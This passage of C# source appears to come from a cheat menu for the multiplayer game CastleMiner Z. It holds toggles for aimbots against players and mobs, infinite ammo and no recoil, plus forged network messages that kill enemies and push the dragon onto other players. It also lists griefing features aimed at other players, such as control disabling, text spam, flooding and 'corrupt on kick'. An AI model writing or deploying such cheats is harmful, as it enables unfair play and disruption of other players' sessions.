                try { InfiniteAmmo(enabled); } catch { }
                SendLog($"Infinite Ammo: {enabled}");
            };

            void InfiniteAmmo(bool enabled)
            {
                _noConsumeAmmo = enabled;

                if (enabled)
                {
                    // Make sure our message handler exists and is subscribed.
                    if (MsgHandler == null) MsgHandler = new LocalPlayer();
                    GameMessageManager.Instance.Subscribe(MsgHandler, new[] { GameMessageType.LocalPlayerFiredGun });
                }
                else
                {
                    if (MsgHandler != null)
                        GameMessageManager.Instance.UnSubscribe(GameMessageType.LocalPlayerFiredGun, MsgHandler);
                }
            }
            #endregion

            #region Infinite Clips

            Callbacks.OnInfiniteClips = enabled =>
            {
                _infiClipsEnabled = enabled;
                SendLog($"Infinite Clips: {enabled}");
            };
            #endregion

            #region Rapid Fire

            Callbacks.OnRapidFire = enabled =>
            {
                _rapidFireEnabled = enabled;
                WeaponExtensions.SetRapidFire(enabled);
                SendLog($"Rapid Fire: {enabled}");
            };
            #endregion

            #region No Gun Cooldown

            Callbacks.OnNoGunCooldown = enabled =>
            {
                _noGunCooldownEnabled = enabled;
                SendLog($"No Gun Cooldown: {enabled}");
            };
            #endregion

            #region No Gun Recoil

            Callbacks.OnNoGunRecoil = enabled =>
            {
                _noGunRecoilEnabled = enabled;
                SendLog($"No Gun Recoil: {enabled}");
            };
            #endregion

            #region Chaotic Aim

            Callbacks.OnChaoticAim = enabled =>
            {
                _chaoticAimEnabled = enabled;
                SendLog($"Chaotic Aim: {enabled}");
            };
            #endregion

            #region Projectile Tuning

            Callbacks.OnProjectileTuning = enabled =>
            {
                _projectileTuningEnabled = enabled;

                try
                {
                    if (_projectileTuningEnabled)
                        _projectileTuningValue = IGMainUI._projectileTuningValue;
                }
                catch { }
                SendLog($"Projectile Tuning: {enabled}");
            };
            Callbacks.OnProjectileTuningValue = value =>
            {
                try
                {
                    if (_projectileTuningEnabled)
                        _projectileTuningValue = value;
                }
                catch { }
            };
            #endregion

            #region Player Aimbot

            Callbacks.OnPlayerAimbot = enabled =>
            {
                _playerAimbotEnabled = enabled;
                SendLog($"Player Aimbot: {enabled}");
            };
            #endregion

            #region Dragon Aimbot

            Callbacks.OnDragonAimbot = enabled =>
            {
                _dragonAimbotEnabled = enabled;
                SendLog($"Dragon Aimbot: {enabled}");
            };
            #endregion

            #region Mob Aimbot

            Callbacks.OnMobAimbot = enabled =>
            {
                _mobAimbotEnabled = enabled;
                SendLog($"Mob Aimbot: {enabled}");
            };
            #endregion

            #region Aimbot Bullet Drop

            Callbacks.OnAimbotBulletDrop = enabled =>
            {
                _aimbotBulletDropEnabled = enabled;
                SendLog($"Aimbot - Adjust For Bullet Drop: {enabled}");
            };
            #endregion

            #region Aimbot Require LoS

            Callbacks.OnAimbotRequireLos = enabled =>
            {
                _aimbotRequireLosEnabled = enabled;
                SendLog($"Aimbot - Require LoS: {enabled}");
            };
            #endregion

            #region Aimbot Face Enemy

            Callbacks.OnAimbotFaceEnemy = enabled =>
            {
                _aimbotFaceEnemyEnabled = enabled;
                SendLog($"Aimbot - Face Enemy: {enabled}");
            };
            #endregion

            #region Aimbot Random Delay

            Callbacks.OnAimbotRandomDelayValue = value =>
            {
                _aimbotRandomDelay = value;
                // SendLog($"Aimbot - Random Delay: {value}");
            };
            #endregion

            #region No Mob Blocking

            Callbacks.OnNoMobBlocking = enabled =>
            {
                _noMobBlockingEnabled = enabled;
                SendLog($"No Mob Blocking: {enabled}");
            };
            #endregion

            #region Shoot Host Ammo

            Callbacks.OnShootHostAmmo = enabled =>
            {
                _shootHostAmmoEnabled = enabled;
                SendLog($"Shoot Host Ammo: {enabled}");
            };
            #endregion

            #region Shoot Bow Ammo

            Callbacks.OnShootBowAmmo = enabled =>
            {
                _shootBowAmmoEnabled = enabled;
                SendLog($"Shoot Bow Ammo: {enabled}");
            };
            #endregion

            #region Shoot Fireball Ammo

            Callbacks.OnShootFireballAmmo = enabled =>
            {
                _shootFireballAmmoEnabled = enabled;
                SendLog($"Shoot Fireball Ammo: {enabled}");
            };
            Callbacks.OnFireball = value =>
            {
                _shootFireballType = FireballToDragon((FireballTypes)value);
            };
            #endregion

            #region Max Rocket Speed

            Callbacks.OnRocketSpeed = enabled =>
            {
                _rocketSpeedEnabled = enabled;
                SendLog($"Custom Rocket Speed: {enabled}");
            };
            Callbacks.OnRocketSpeedValue = value =>
            {
                try
                {
                    if (_rocketSpeedEnabled)
                        _rocketSpeedValue = value;
                }
                catch { }
            };
            Callbacks.OnGuidedRocketSpeedValue = value =>
            {
                try
                {
                    if (_rocketSpeedEnabled)
                        _guidedRocketSpeedValue = value;
                }
                catch { }
            };
            #endregion

            #region PvP Thorns

            Callbacks.OnPvpThorns = enabled =>
            {
                _pvpThornsEnabled = enabled;
                SendLog($"PvP Thorns: {enabled}");
            };
            #endregion

            #region Death Aura

            Callbacks.OnDeathAura = enabled =>
            {
                _deathAuraEnabled = enabled;
                SendLog($"Death Aura: {enabled}");
            };
            Callbacks.OnDeathAuraRangeValue = value =>
            {
                _deathAuraRange = value;
            };
            #endregion

            #region Begone Aura

            Callbacks.OnBegoneAura = enabled =>
            {
                _begoneAuraEnabled = enabled;
                SendLog($"Begone Aura: {enabled}");
            };
            Callbacks.OnBegoneAuraRangeValue = value =>
            {
                _begoneAuraRange = value;
            };
            #endregion

            /// === [Test / Debug] ===

            #region Trail Mode

            Callbacks.OnTrailMode = enabled =>
            {
                _trialModeEnabled = enabled;
                SendLog($"Trail Mode: {enabled}");
            };
            #endregion

            #region Test Stats

            Callbacks.OnTest = enabled =>
            {
                try
                {
                    /*
                    var gm     = CastleMinerZGame.Instance;
                    var mgr    = gm?.AcheivmentManager;
                    var game   = CastleMinerZGame.Instance;
                    var item   = InventoryItem.CreateItem(InventoryItemIDs.DirtBlock, 64);
                    var screen = CastleMinerZGame.Instance?.GameScreen?._uiGroup?.CurrentScreen.GetType().Name;
                    var terr   = BlockTerrain.Instance;
                    */
                }
                catch (Exception ex) { Log($"{ex}."); }
            };
            #endregion

            // Heartbeat while the UI is visible.
            // Callbacks.OnTick = () => { };
        }

        #region On-Tick

        #region Tick Delay Gates (Per-Feature Cooldowns)

        // "Next time (ms) this action is allowed to run".
        private double _rapidItemsMs, _showerMs, _itemVortexMs, _chaosMs, _spamTextMs;

        #endregion

        /// <summary>
        /// Called once per game tick.
        /// </summary>
        public override void Tick(InputManager inputManager, GameTime gameTime)
        {
            // Get the active config snapshot, loading defaults if one has not been cached yet.
            var cfg = ModConfig.Current ?? ModConfig.LoadOrCreateDefaults();

            // Current tick time in milliseconds (used for per-feature delay gates).
            double nowMs = gameTime.TotalGameTime.TotalMilliseconds;

            // Cache whether the player is currently inside an active game session.
            bool inGame = IsInGame();

            // Run queued actions on the game thread.
            MainThread.Pump();

            // Reapply session-local runtime hooks once when entering or re-entering a live game.
            if (inGame && !_wasInGame)
            {
                ReapplySessionLocalState();
                IGMainUI.ApplyRememberedTogglesIfPending();
                IGMainUI.ApplyRememberedSlidersIfPending();
            }

            // One-time transition: Just LEFT the game -> clean up & disable features.
            if (!inGame && _wasInGame)
            {
                // Always tear down session-local live hooks.
                try { WeaponExtensions.SetRapidFire(false);     } catch { }
                try { WeaponExtensions.SetSuperGunStats(false); } catch { }

                // Infinite ammo listener off.
                try
                {
                    if (MsgHandler != null)
                        GameMessageManager.Instance?.UnSubscribe(GameMessageType.LocalPlayerFiredGun, MsgHandler);
                } catch { }

                // These are safer to turn off when no world is active.
                try { BlockEspRenderer.Invalidate();                                                                         } catch { } // Ensure we clear the Block ESP cache.
                if (GamePatches.XRayConfig.Enabled)                   try { GamePatches.XRayRuntime.SetEnabled(false);       } catch { } // Ensure we turn off the xray mod.
                if (GamePatches.FullBrightRuntime.UseFullBrightTiles) try { GamePatches.FullBrightRuntime.SetEnabled(false); } catch { } // Ensure we turn off the full-bright mod.

                // Reset states when config allows.
                if (!cfg.PreserveTogglesWhenLeavingGame)
                {
                    // Turn off our runtime toggles so Tick won't try to act.
                    // (only add tick-based / patch-based bools here).
                    #region Runtime Toggles

                    /* Global */   _noConsumeAmmo
                    /* Tick   */ = _noEnemiesEnabled           = _noTargetEnabled          = _playerAimbotEnabled        = _dragonAimbotEnabled    = _mobAimbotEnabled           = _playerPositionEnabled   =
                                   _rideDragonEnabled          = _forceRespawnEnabled
                    /* Patch  */ = _infiniteItemsEnabled       = _tracersEnabled           = _hitboxesEnabled            = _noKickEnabled          = _vanishEnabled              = _godEnabled              =
                                   _pickupRangeEnabled         = _noGunCooldownEnabled     = _noGunRecoilEnabled         = _xrayEnabled            = _instantMineEnabled         = _rapidToolsEnabled       =
                                   _noMobBlockingEnabled       = _multiColorAmmoEnabled    = _multiColorRNGEnabled       = _shootBlocksEnabled     = _shootHostAmmoEnabled       = _shootGrenadeAmmoEnabled =
                                   _shootRocketAmmoEnabled     = _freezeLasersEnabled      = _extendLaserTimeEnabled     = _infiLaserPathEnabled   = _infiLaserBounceEnabled     = _explosiveLasersEnabled  =
                                   _noTPOnServerRestartEnabled = _corruptOnKickEnabled     = _projectileTuningEnabled    = _freeFlyCameraEnabled   = _noClipEnabled              = _shootBowAmmoEnabled     =
                                   _explodingOresEnabled       = _shootFireballAmmoEnabled = _rocketSpeedEnabled         = _gravityEnabled         = _disableInvRetrievalEnabled = _cameraXyzEnabled        =
                                   _muteEnabled                = _muteWarnOffenderEnabled  = _muteShowMessageEnabled     = _trailEnabled           = _trailPrivateEnabled        = _showerEnabled           =
                                   _dragonCounterEnabled       = _hatEnabled               = _bootsEnabled               = _rapidItemsEnabled      = _disableControlsEnabled     = _itemVortexEnabled       =
                                   _beaconModeEnabled          = _chaosModeEnabled         = _clockDiscordEnabled        = _dragonDiscordEnabled   = _hugEnabled                 = _noLavaVisualsEnabled    =
                                   _reliableFloodEnabled       = _blockEspEnabled          = _blockEspNoTraceEnabled     = _nametagsEnabled        = _infiClipsEnabled           = _spamTextEnabled         =
                                   _spamTextSudoEnabled        = _chaoticAimEnabled        = _disableItemPickupEnabled   = _rapidPlaceEnabled      = _sudoPlayerEnabled          = _doorSpamEnabled         =
                                   _allGunsHarvestEnabled      = _pvpThornsEnabled         = _trialModeEnabled           = _deathAuraEnabled       = _begoneAuraEnabled          = _blockNukerEnabled
                        = false;

                    // Disable TriState ticks.
                    /* Tick   */   _worldTimeState
                        = TriState.Off;

                    // Disable PlayerSelectScope ticks.
                    /* Tick   */   _shootBlockScope = _shootAmmoScope
                        = PlayerSelectScope.Personal;

                    // Disable VanishSelectScope ticks.
                    /* Tick   */   _vanishScope
                        = VanishSelectScope.InPlace;

                    // Disable PlayerTargetMode ticks.
                    /* Tick   */   _forceRespawnTargetMode  = _muteTargetMode          = _disableControlsTargetMode = _trailTargetMode      = _rapidItemsTargetMode = _showerTargetMode   =
                                   _hugTargetMode           = _reliableFloodTargetMode = _spamTextTargetMode        = _itemVortexTargetMode = _sudoPlayerTargetMode = _doorSpamTargetMode
                        = PlayerTargetMode.None;

                    // Reset NetworkIds ticks.
                    /* Tick   */   _forceRespawnTargetNetids  = _muteTargetNetids       = _disableControlsTargetNetids = _trailTargetNetids = _rapidItemsTargetNetids = _showerTargetNetids =
                                   _reliableFloodTargetNetids = _itemVortexTargetNetids = _doorSpamTargetNetids
                        = new byte[0];

                    // Reset NetworkId ticks.
                    /* Tick   */   _hugTargetNetid = _spamTextTargetNetid = _sudoPlayerTargetNetid
                        = (byte)0;

                    // Reset pickup entity & spawner id counters.
                    /* Tick   */   _globalPickupIdCounter = _globalSpawnerIdCounter
                        = (int)0;

                    // Reset live vector ticks.
                    /* Tick   */   _hugLocation
                        = Vector3.Zero;

                    #endregion

                    // Persist the last in-game checkbox states before the out-of-game reset runs.
                    try { IGMainUI.CaptureRememberedToggleSnapshot(); } catch { }
                    try { IGMainUI.CaptureRememberedSliderSnapshot(); } catch { }

                    // Clear UI selection data.
                    // (Optional) Don't populate the players if the UI is hidden.
                    if (ImGuiXnaRenderer.Visible && !GameIsMinimiMob()) SetPlayers(Array.Empty<NetworkGamer>());

                    // Untick the UI checkboxes so the panel matches reality.
                    ResetToggleStates();
                    IGMainUI.QueueRememberedToggleRestore();
                    IGMainUI.QueueRememberedSliderRestore();
                }
            }

            // If not in a game, skip all per-frame effects.
            if (!inGame)
            {
                _wasInGame = false;
                return;
            }

            // If in-game, update the enum dropdown comboxes.
            if (inGame)
            {
                if (IGMainUI._difficultyIndex != (int)CastleMinerZGame.Instance.Difficulty)
                    IGMainUI._difficultyIndex  = (int)CastleMinerZGame.Instance.Difficulty;

                if (IGMainUI._gameModeIndex   != (int)CastleMinerZGame.Instance.GameMode)
                    IGMainUI._gameModeIndex    = (int)CastleMinerZGame.Instance.GameMode;

                /// [Homes]

                // Update the per-world homes.
                HomesExtensions.EnsureLoaded();

                /// [Blacklists]
                // Load + enforce (host-side).
                BlacklistExtensions.EnsureLoaded();
                BlacklistEnforcer.Tick(gameTime);
            }

            // Normal in-game loops.
            if (_noEnemiesEnabled)      { try { KillAllMonsters();                                           } catch { } }
            if (_noTargetEnabled)       { try { ForceEnemiesToGiveUp();                                      } catch { } }
            if (_playerAimbotEnabled || _mobAimbotEnabled || _dragonAimbotEnabled)
                                        { try { UnifiedAimbot(requireVisible:      _aimbotRequireLosEnabled,
                                                              faceTorwardsEnemy:   _aimbotFaceEnemyEnabled,
                                                              adjustForBulletDrop: _aimbotBulletDropEnabled,
                                                              infiniteAmmo:        _noConsumeAmmo,
                                                              enemyYOffset:        new Vector3(0, 1.2f, 0),
                                                              includePlayers:      _playerAimbotEnabled,
                                                              includeMobs:         _mobAimbotEnabled,
                                                              includeDragons:      _dragonAimbotEnabled);    } catch { } }
            if (_worldTimeState == TriState.Mixed)
                                         { try { KeepWorldTimeFrozen();                                      } catch { } }
            if (_drFrozen)               { try { DR_FreezeTick();                                            } catch { } }
            if (_rideDragonEnabled)      { try { RideDragonTick();                                           } catch { } }
            if (_forceRespawnEnabled)    { try { ForceRespawnTick();                                         } catch { } }
            if (_reliableFloodEnabled)   { try { ReliableFloodTick();                                        } catch { } }
            if (_hugEnabled)             { try { HugTick();                                                  } catch { } }
            if (_blockEspEnabled)        { try { BlockEspRenderer.Update();                                  } catch { } }
            if (_hatEnabled)             { try { WearTick();                                                 } catch { } }
            if (_disableControlsEnabled) { try { DisableControlsTick();                                      } catch { } }
            if (_trailEnabled)           { try { TrailTick();                                                } catch { } }
            if (_dragonCounterEnabled)   { try { DragonEnduranceKillAnnouncer.TickDragonKillAnnouncement();  } catch { } }
            if (_doorSpamEnabled)        { try { DoorSpamTick();                                             } catch { } }
            if (_deathAuraEnabled)       { try { DeathAuraTick();                                            } catch { } }
            if (_begoneAuraEnabled)      { try { BegoneAuraTick();                                           } catch { } }
            if (_blockNukerEnabled)      { try { BlockNukerTick();                                           } catch { } }

            // Per-feature delay gated in-game loops.
            if (_rapidItemsEnabled)
            {
                if (DelayGate(ref _rapidItemsMs, nowMs, delayMs: _rapidItemsTimerValue))
                    try { RapidItemsTick(); } catch { }
            } else { _rapidItemsMs = 0; }
            if (_showerEnabled)
            {
                if (DelayGate(ref _showerMs, nowMs, delayMs: _showerTimerValue))
                    try { ShowerTick(); } catch { }
            } else { _showerMs = 0; }
            if (_itemVortexEnabled)
            {
                if (DelayGate(ref _itemVortexMs, nowMs, delayMs: _itemVortexTimerValue))
                    try { ItemVortexTick(); } catch { }
            } else { _itemVortexMs = 0; }
            if (_chaosModeEnabled)
            {
                if (_clockDiscordEnabled) // Clock uses a two-phase timed cycle: 1f -> wait -> random -> wait -> repeat.
                {
                    if (DelayGate(ref _clockDiscordNextMs, nowMs, delayMs: _chaosTimerValue))
                        try { ClockDiscordTick(); } catch { }
                }
                else
                { _clockDiscordNextMs = 0; _clockDiscordPendingRandom = false; }

                // Other chaos features.
                if (DelayGate(ref _chaosMs, nowMs, delayMs: _chaosTimerValue))
                    try { ChaosTick(); } catch { }
            }
            else { _chaosMs = 0; _clockDiscordNextMs = 0; _clockDiscordPendingRandom = false; }
            if (_spamTextEnabled)
            {
                if (DelayGate(ref _spamTextMs, nowMs, delayMs: _spamTextValue))
                    try { SpamTextTick(); } catch { }
            }
            else { _spamTextMs = 0; }

            try { WeaponExtensions.Tick(); } catch { }
            _wasInGame = true;
        }

        #region Reapply Session-Local Runtime State

        /// <summary>
        /// Reapplies session-local runtime features after entering or re-entering an active
        /// game session. This restores temporary hooks and runtime-only systems that are
        /// intentionally torn down when leaving a world.
        /// </summary>
        private void ReapplySessionLocalState()
        {
            // Reapply direct weapon stat hooks.
            try { if (_rapidFireEnabled) WeaponExtensions.SetRapidFire(true);             } catch { }
            try { if (_superGunStatsEnabled) WeaponExtensions.SetSuperGunStats(true);     } catch { }

            // Reapply infinite-ammo subscription.
            try
            {
                if (_noConsumeAmmo)
                {
                    if (MsgHandler == null)
                        MsgHandler = new LocalPlayer();

                    GameMessageManager.Instance?.Subscribe(
                        MsgHandler,
                        new[] { GameMessageType.LocalPlayerFiredGun });
                }
            }
            catch { }

            // Reapply visual runtime toggles.
            try { if (_xrayEnabled) GamePatches.XRayRuntime.SetEnabled(true);             } catch { }
            try { if (_fullBrightEnabled) GamePatches.FullBrightRuntime.SetEnabled(true); } catch { }

            // Clear any stale Block ESP cache after session transition.
            try { BlockEspRenderer.Invalidate();                                          } catch { }
        }
        #endregion

        #region TICK: No Enemies

        public static void KillAllMonsters()
        {
            if (EnemyManager.Instance.DragonIsAlive)
            {
                KillDragonMessage.Send(CastleMinerZGame.Instance.MyNetworkGamer, EnemyManager.Instance.DragonPosition, CastleMinerZGame.Instance.MyNetworkGamer.Id, InventoryItemIDs.DiamondSpacePumpShotgun);
            }
            foreach (var baseZombie in EnemiesRef(EnemyManager.Instance).ToArray())
            {
                KillEnemyMessage.Send(CastleMinerZGame.Instance.MyNetworkGamer, baseZombie.EnemyID, (int)baseZombie.Target.Gamer.Id, CastleMinerZGame.Instance.MyNetworkGamer.Id, InventoryItemIDs.BloodStoneLaserSword);
            };
        }
        #endregion

        #region TICK: No Target

        public static void ForceEnemiesToGiveUp(bool everyone = false)
        {
            // Enemies.
            try
            {
                EnemiesRef(EnemyManager.Instance).ForEach(delegate (BaseZombie baseZombie)
                {
                    if (everyone || baseZombie.Target == CastleMinerZGame.Instance.LocalPlayer.Gamer.Tag)
                    {
                        baseZombie.GiveUp();
                    }
                });
            }
            catch (Exception) { }

            // Dragons.
            try
            {
                var currentDragon = DragonEntityRef(EnemyManager.Instance);

                if (currentDragon != null && everyone)
                {
                    // Remove the dragon for everyone.
                    RemoveDragonMessage.Send((LocalNetworkGamer)CastleMinerZGame.Instance.LocalPlayer.Gamer);
                }
                else if (currentDragon != null && (currentDragon.Target == CastleMinerZGame.Instance.LocalPlayer.Gamer.Tag))
                {
                    // Get a random player (excluding ourselves).
                    var randomPlayerID = GetRandomRemoteGamerId();

                    if (randomPlayerID != null)
                    {
                        var randomPlayer = (Player)FindGamerById(CastleMinerZGame.Instance.CurrentNetworkSession.AllGamers, randomPlayerID.Value).Tag;

                        // Check if a valid player was found.
                        if (!everyone && randomPlayer != null) // Migrate the dragon to a randomly targeted player.
                        {
                            // Do not touch 'MigrateDragonMessage', let the game engine's ownership model do its thing naturally.
                            EnemyManager.Instance.MigrateDragon(randomPlayer, GetExistingDragonInfo());
                            return;
                        }
                    }

                    // No valid players found, just remove the dragon.
                    RemoveDragonMessage.Send((LocalNetworkGamer)CastleMinerZGame.Instance.LocalPlayer.Gamer);
                }
            }
            catch (Exception) { }

            #region Helpers

            /// <summary>
            /// Snapshot the current server-authoritative dragon state into a
            /// DragonHostMigrationInfo payload (used when migrating dragon ownership).
            /// </summary>
            DragonHostMigrationInfo GetExistingDragonInfo()
            {
                var mgr          = EnemyManager.Instance;
                var latestDragon = DragonEntityRef(mgr);
                if (latestDragon == null) return default;

                return new DragonHostMigrationInfo
                {
                    Yaw               = latestDragon.Yaw,
                    TargetYaw         = latestDragon.TargetYaw,
                    Roll              = latestDragon.Roll,
                    TargetRoll        = latestDragon.TargetRoll,
                    Pitch             = latestDragon.Pitch,
                    TargetPitch       = latestDragon.TargetPitch,
                    NextDragonTime    = latestDragon.DragonTime     + 0.4f,
                    NextUpdateTime    = latestDragon.NextUpdateTime + 0.4f,
                    Position          = latestDragon.LocalPosition,
                    Velocity          = latestDragon.Velocity,
                    TargetVelocity    = latestDragon.TargetVelocity,
                    DefaultHeading    = latestDragon.DefaultHeading,
                    NextFireballIndex = latestDragon.GetNextFireballIndex(),
                    ForBiome          = latestDragon.ForBiome,
                    Target            = latestDragon.TravelTarget,
                    EType             = latestDragon.EType.EType,
                 // FlapDebt          = latestDragon.FlapDebt,
                 // Animation         = latestDragon.CurrentAnimation,
                };
            }

            /// <summary>
            /// Pick a random remote gamer id (byte) from the current session.
            /// Returns null if there is no session or no eligible peers.
            ///
            /// Implementation details:
            /// • Filters out null, and left-session gamers.
            /// • By default excludes locals; set <paramref name="includeLocal"/> = true to allow them.
            /// • Uses crypto RNG (rejection sampling) to avoid modulo bias.
            /// • Returns the Gamer.Id (byte) directly; you can resolve to NetworkGamer with FindGamerById.
            /// </summary>
            byte? GetRandomRemoteGamerId(bool includeLocal = false)
            {
                var session = CastleMinerZGame.Instance.CurrentNetworkSession;
                if (session == null) return null;

                // Build pool: Non-null, not local, not left.
                var pool = new List<byte>(session.AllGamers.Count);
                for (int i = 0; i < session.AllGamers.Count; i++)
                {
                    var g = session.AllGamers[i];
                    if (g == null || g.HasLeftSession) continue;
                    if (!includeLocal && g.IsLocal)    continue;
                    pool.Add(g.Id); // XNA's NetworkGamer.Id is a byte.
                }

                if (pool.Count == 0)
                    return null;

                int idx = SecureRandomIndex(pool.Count);
                return pool[idx];
            }

            /// <summary>
            /// Unbiased crypto-random integer in [0, upperExclusive).
            /// Uses rejection sampling with RNGCryptoServiceProvider:
            /// • Fast single-byte path for N ≤ 256.
            /// • 32-bit path for larger N.
            /// </summary>
            int SecureRandomIndex(int upperExclusive)
            {
                if (upperExclusive <= 0) return 0;

                // Use RNGCryptoServiceProvider (compatible with older frameworks/runtimes).
                using (var rng = new RNGCryptoServiceProvider())
                {
                    // Fast path: 1 byte is enough for N ≤ 256.
                    if (upperExclusive <= 256)
                    {
                        var buf = new byte[1];
                        int limit = 256 - (256 % upperExclusive); // Highest unbiased value+1.
                        byte x;
                        do
                        {
                            rng.GetBytes(buf);
                            x = buf[0];
                        } while (x >= limit);                     // Reject biased tail.
                        return x % upperExclusive;
                    }

                    // General path: 32-bit rejection sampling.
                    var buf4 = new byte[4];
                    uint ub = (uint)upperExclusive;
                    uint lim = (uint.MaxValue / ub) * ub;         // Largest multiple of ub that fits.
                    uint val;
                    do
                    {
                        rng.GetBytes(buf4);
                        val = BitConverter.ToUInt32(buf4, 0);
                    } while (val >= lim);
                    return (int)(val % ub);
                }
            }

            /// <summary>
            /// Find a NetworkGamer by its byte id (no LINQ; safe for hot paths).
            /// Returns null if not found.
            /// </summary>
            NetworkGamer FindGamerById(GamerCollection<NetworkGamer> col, byte id)
            {
                // Use indexer to avoid enumerator allocations.
                for (int i = 0; i < col.Count; i++)
                {
                    var g = col[i];
                    if (g != null && g.Id == id)
                        return g;
                }
                return null;
            }
            #endregion
        }
        #endregion

        #region TICK: Uniform Aimbot

        /// <summary>
        /// Per-tick aimbot driver for entity targets.
        /// - Input gate: Only runs while MMB is held (clears state otherwise).
        /// - Targeting: Picks the closest valid enemy (optionally LOS-gated).
        /// - Aiming:
        ///     * If not forcing the camera to face the enemy, tries ballistic aim when it makes sense
        ///       (guns that actually drop, toggle-controlled), else uses flat aim.
        ///     * If forcing face-towards-enemy, uses the current camera basis (keep behavior stable).
        ///     * ADS spread override: While "aiming" temporarily swap hip-fire spread with the
        ///       gun's shouldered (ADS) spread for the shot. This only affects accuracy values.
        /// - Grenades: Handled via a separate path; do not fall through to gun fire.
        /// - Cadence: Honors vanilla ROF unless a custom speed is provided.
        /// - Fire: Routes through TryFireWithAimMatrix to use the game's normal Shoot() pipeline.
        /// </summary>
        /// <param name="speed">
        /// Optional custom delay (ms) for rate limiting. null = use vanilla cooldown.
        /// </param>
        /// <param name="requireVisible">
        /// If true, AimTargeting ignores occluded targets (line-of-sight requirement).
        /// </param>
        /// <param name="faceTorwardsEnemy">
        /// If true, we keep the camera facing the target and build fireL2W from the view directly
        /// (skip ballistic correction unless you enable the commented block).
        /// </param>
        /// <param name="adjustForBulletDrop">
        /// Master toggle for ballistic correction on bullet weapons (ignored for lasers/rockets/grenades).
        /// </param>
        /// <param name="infiniteAmmo">
        /// If true, all weapons will fire regardless of ammo count (disabled by default).
        /// </param>
        /// <param name="enemyYOffset">
        /// Optional aim offset on the target (e.g., head height). Defaults to ~1.2 blocks up.
        /// </param>
        /// <param name="includePlayers">
        /// If true, Players will be included in the aimbot pipeline.
        /// </param>
        /// <param name="includeMobs">
        /// If true, Mobs will be included in the aimbot pipeline.
        /// </param>
        /// <param name="includeDragons">
        /// If true, Dragons will be included in the aimbot pipeline.
        /// </param>
        public static void UnifiedAimbot(
            int?     speed               = null,
            bool     requireVisible      = false,
            bool     faceTorwardsEnemy   = false,
            bool     adjustForBulletDrop = false,
            bool     infiniteAmmo        = false,
            Vector3? enemyYOffset        = null,
            bool     includePlayers      = true,
            bool     includeMobs         = true,
            bool     includeDragons      = true
        )
        {
            // Input gate: Only run while MMB is held. Clear crosshair/target promptly when released.
            if (Mouse.GetState().MiddleButton != Microsoft.Xna.Framework.Input.ButtonState.Pressed)
            {
                AimbotController.Clear();
                return;
            }

            // No categories enabled? Nothing to do.
            if (!includePlayers && !includeMobs && !includeDragons)
            {
                AimbotController.Clear();
                return;
            }

            // Acquire a target (closest valid enemy among the enabled sets). Respect LOS if requested.
            if (!AimTargeting.TryFindClosestEnabledTarget(includePlayers, includeMobs, includeDragons, requireVisible,
                                                          out var target, out _))
            {
                AimbotController.Clear();
                return;
            }

            var game = CastleMinerZGame.Instance;
            if (!(game.LocalPlayer.FPSCamera is PerspectiveCamera cam)) return;

            // Prime shared controller state used by other patches (e.g., face-towards, crosshair).
            AimbotController.ShowTargetCrosshair = true;
            AimbotController.FaceTorwardsEnemy   = faceTorwardsEnemy;
            AimbotController.IsShouldered        = game.LocalPlayer.ShoulderedAnimState;
            AimbotController.Target              = target;
            AimbotController.Offset              = enemyYOffset ?? new Vector3(0f, 1.2f, 0f);

            // Active item drives both aim math (ballistic vs flat) and the fire path.
            var inv  = game.LocalPlayer.PlayerInventory;
            var item = inv.ActiveInventoryItem;
            if (item == null) return;

            // Build the orientation we'll shoot with.
            Matrix fireL2W;

            if (!faceTorwardsEnemy)
            {
                // Prefer ballistic aim for "real" bullets when enabled and supported by the item.
                // (Lasers/rockets/grenades are filtered inside ShouldApplyBulletDrop).
                bool useBallistics = AimbotBallistics.ShouldApplyBulletDrop(item, adjustForBulletDrop);
                if (useBallistics && item is GunInventoryItem gi &&
                    AimbotBallistics.TryMakeAimL2W_WithBallistics(
                        cam, target, AimbotController.Offset, gi.GunClass, out fireL2W))
                {
                    // Success: fireL2W is gravity-compensated (low-arc solution).
                }
                // Fallback: Flat lead/roll solution. If that also fails, shoot straight down the view.
                else if (!AimMath.TryMakeAimL2W(
                             cam, target, AimbotController.Offset,
                             AimbotController.LeadSpeed, AimbotController.Roll, out fireL2W))
                {
                    fireL2W = Matrix.Invert(cam.View); // Safe, latency-free fallback.
                }
            }
            else
            {
                // "Face target" mode: Keep camera basis. (Stable feel; avoids camera pops.).
                // If you want ballistic correction even while facing, see the commented block below.
                fireL2W = Matrix.Invert(cam.View);

                /*
                bool useBallistics = ShouldApplyBulletDrop(item);
                if (useBallistics && gi != null &&
                    AimbotBallistics.TryMakeAimL2W_WithBallistics(
                        cam, tgt, AimbotController.Offset, gi.GunClass, out fireL2W)) { }
                */
            }

            // Grenade path //
            if (item.ItemClass is GrenadeInventoryItemClass)
            {
                // Let the vanilla grenade throw pipeline send the message when the animation fires,
                // but supply a pre-aimed orientation once (TryThrowAtTarget handles ballistic vs flat).
                AimbotGrenades.TryThrowAtTarget(
                    AimbotController.Target,
                    AimbotController.Offset,
                    adjustForBulletDrop
                );
                return; // IMPORTANT: Do not also call gun/rocket fire below.
            }

            // Cadence / cooldown //
            // If no custom cadence was requested, mirror vanilla ROF timers so this plays nice in MP.
            var baseTimer = CooldownBridge.TryGetBaseTimer(item);
            if (speed == null)                   // Vanilla cadence.
            {
                if (!CooldownBridge.IsExpired(baseTimer))
                    return;                      // Too soon to fire again.
                                                 // Random delay gate (0 disables).
                if (!AimbotRateLimiter.TryConsumeRandomDelayOnly(item))
                    return;
                CooldownBridge.Reset(baseTimer); // Align with vanilla rhythm.
            }
            else
            {
                // Custom cadence: Go through our limiter to throttle sends.
                if (!AimbotRateLimiter.TryConsumeWithRandom(item, speed.Value))
                    return;
            }

            // Fire //
            // Route through the game's normal HUD.Shoot(..) using our computed fireL2W.
            // (This keeps ammo, recoil, tracers, and net replication consistent with vanilla.).
            AimbotFire.TryFireWithAimMatrix(fireL2W, infiniteAmmo);
        }
        #endregion

        #region TICK: Freeze World Time

        public static void KeepWorldTimeFrozen()
        {
            try
            {
                // Build the world time format.
                int   day           = _timeDay - 1;                // The game uses 0 for the day-1 baseline.
                float time          = (float)(_timeScale / 100.0); // Define new time from a 0.0-1.0 range.
                float newTimeFormat = day + time;

                // Sanity check to redurce network calls.
                if (newTimeFormat == CastleMinerZGame.Instance.GameScreen.Day)                      // Use '.Day' for full timestamp.
                    return;

                // Check if we are host.
                if (!CastleMinerZGame.Instance.CurrentNetworkSession.IsHost)
                    TimeOfDayMessage.Send(CastleMinerZGame.Instance.MyNetworkGamer, newTimeFormat); // Send the new time globally.

                // Always syncronize the time with our client.
